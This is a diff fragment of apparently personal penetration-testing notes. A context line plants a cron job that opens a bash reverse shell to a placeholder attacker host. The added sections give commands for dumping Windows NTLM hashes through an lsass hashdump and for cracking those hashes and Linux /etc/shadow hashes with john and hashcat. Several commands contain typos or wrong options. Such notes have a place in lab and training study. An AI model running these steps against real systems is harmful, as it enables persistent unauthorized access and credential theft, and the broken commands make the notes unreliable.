@@ -295,13 +295,33 @@ cat /etc/cron
 echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/KALIIP/KALIPORT 0>&1'" > cron
 crontab -i cron
 crontab -l 
-
-
-
-
-
-
 ```
 
+## Dumping and Cracking NTML HASHES
++ Windoes store account password in SAMS
+```
+> pgrep lsass
+> migrate num
+> hashdump
+john --list=formats | grep NT
+john --format=NT hashes.txt
 
+john --format=NT hashes.tx --wordlist=/usr/share/wordlists/rockyou.txt
 
+hashcat -a3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
+```
+## Dumping and Cracking Linux Password Hashes 
++ /etc/shadow ALL PASSWORD IFLES STORED
++ $1 md5
++ $2blowfish
++ $5 sha256
++ $6 sha512
++ 
++
+```
+john --format=sha512crypt file_location -wwordlist=/usr/share/wordlists/rockyou.txt
+
+hashcat -a3 -m 1800 file_location wordlist_location
+```
+## Pivoting 
++ 
